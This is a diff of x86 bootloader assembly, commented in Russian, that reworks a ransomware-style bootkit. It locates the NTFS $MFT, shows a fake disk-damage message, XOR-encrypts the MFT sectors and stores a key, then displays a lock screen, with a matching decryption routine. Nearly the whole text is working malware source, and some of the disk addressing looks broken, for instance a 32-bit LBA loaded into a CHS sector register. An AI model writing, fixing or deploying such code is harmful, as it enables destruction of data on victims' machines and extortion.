@@ -13,11 +13,39 @@ start_stage2:
     int 0x10
 
     ; ============================================================
-    ; ПРОВЕРКА: ЕСТЬ ЛИ КЛЮЧ В СЕКТОРЕ 30?
+    ; ЧИТАЕМ ЗАГРУЗОЧНЫЙ СЕКТОР NTFS (LBA 2048)
     ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    ; ПРОВЕРЯЕМ, ЧТО ЭТО NTFS
+    cmp word [0x9000 + 0x03], 0x4E54    ; "NT"
+    jnz load_error
+    cmp word [0x9000 + 0x05], 0x4653    ; "FS"
+    jnz load_error
+
+    ; ============================================================
+    ; ПОЛУЧАЕМ СМЕЩЕНИЕ $MFT ИЗ ЗАГРУЗОЧНОГО СЕКТОРА
+    ; СМЕЩЕНИЕ 0x30 (48) — LBA $MFT
+    ; ============================================================
+    mov eax, [0x9000 + 0x30]            ; LBA $MFT
+    mov [mft_lba], eax
+
+    ; ============================================================
+    ; ПРОВЕРКА: ЕСТЬ ЛИ КЛЮЧ В СЕКТОРЕ 30?
+    ; ============================================================
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9100
     mov ah, 0x02
     mov al, 1
     mov ch, 0
@@ -27,32 +55,39 @@ start_stage2:
     int 0x13
     jc encrypt_first
 
-    cmp byte [0x9000], 0x00
+    cmp byte [0x9100], 0x00
     je encrypt_first
 
     jmp show_lock_screen
 
 encrypt_first:
+    ; ============================================================
+    ; ПОКАЗЫВАЕМ "ОБНАРУЖЕНА ОШИБКА"
+    ; ============================================================
     mov si, msg_damage
     call print
 
-    ; ЧИТАЕМ MFT (СЕКТОРЫ 3-12)
+    ; ============================================================
+    ; ЧИТАЕМ ПЕРВЫЕ 10 СЕКТОРОВ $MFT
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9100
+    mov bx, 0x9200
     mov ah, 0x02
     mov al, 10
     mov ch, 0
-    mov cl, 3
+    mov cl, [mft_lba]
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
+    ; ============================================================
     ; СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОРЫ 20-29
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9100
+    mov bx, 0x9200
     mov ah, 0x03
     mov al, 10
     mov ch, 0
@@ -62,8 +97,10 @@ encrypt_first:
     int 0x13
     jc load_error
 
+    ; ============================================================
     ; ШИФРУЕМ XOR 0xAA
-    mov si, 0x9100
+    ; ============================================================
+    mov si, 0x9200
     mov cx, 5120
 .encrypt_loop:
     lodsb
@@ -71,20 +108,24 @@ encrypt_first:
     mov [si-1], al
     loop .encrypt_loop
 
-    ; ЗАПИСЫВАЕМ ЗАШИФРОВАННЫЙ MFT
+    ; ============================================================
+    ; ЗАПИСЫВАЕМ ЗАШИФРОВАННЫЙ $MFT
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9100
+    mov bx, 0x9200
     mov ah, 0x03
     mov al, 10
     mov ch, 0
-    mov cl, 3
+    mov cl, [mft_lba]
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
+    ; ============================================================
     ; СОХРАНЯЕМ КЛЮЧ В СЕКТОР 30
+    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, key_data
@@ -114,7 +155,7 @@ show_lock_screen:
     ; ЧИТАЕМ ТЕКСТ ИЗ СЕКТОРА 15
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9200
+    mov bx, 0x9300
     mov ah, 0x02
     mov al, 1
     mov ch, 0
@@ -124,7 +165,7 @@ show_lock_screen:
     int 0x13
     jc load_error
 
-    mov si, 0x9200
+    mov si, 0x9300
     call print
 
     mov ah, 0x02
@@ -157,7 +198,7 @@ decrypt_and_boot:
     ; ЧИТАЕМ КЛЮЧ
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9000
+    mov bx, 0x9100
     mov ah, 0x02
     mov al, 1
     mov ch, 0
@@ -167,24 +208,24 @@ decrypt_and_boot:
     int 0x13
     jc load_error
 
-    mov al, [0x9000]
+    mov al, [0x9100]
     mov [key], al
 
-    ; ЧИТАЕМ ЗАШИФРОВАННЫЙ MFT
+    ; ЧИТАЕМ ЗАШИФРОВАННЫЙ $MFT
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9100
+    mov bx, 0x9200
     mov ah, 0x02
     mov al, 10
     mov ch, 0
-    mov cl, 3
+    mov cl, [mft_lba]
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
     ; РАСШИФРОВЫВАЕМ
-    mov si, 0x9100
+    mov si, 0x9200
     mov cx, 5120
 .decrypt_loop:
     lodsb
@@ -192,14 +233,14 @@ decrypt_and_boot:
     mov [si-1], al
     loop .decrypt_loop
 
-    ; ЗАПИСЫВАЕМ РАСШИФРОВАННЫЙ MFT
+    ; ЗАПИСЫВАЕМ РАСШИФРОВАННЫЙ $MFT
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9100
+    mov bx, 0x9200
     mov ah, 0x03
     mov al, 10
     mov ch, 0
-    mov cl, 3
+    mov cl, [mft_lba]
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -397,5 +438,8 @@ key:
 key_data:
     db 0xAA
     times 511 db 0
+
+mft_lba:
+    dd 0
 
 times 1024 - ($ - 0x8000) db 0
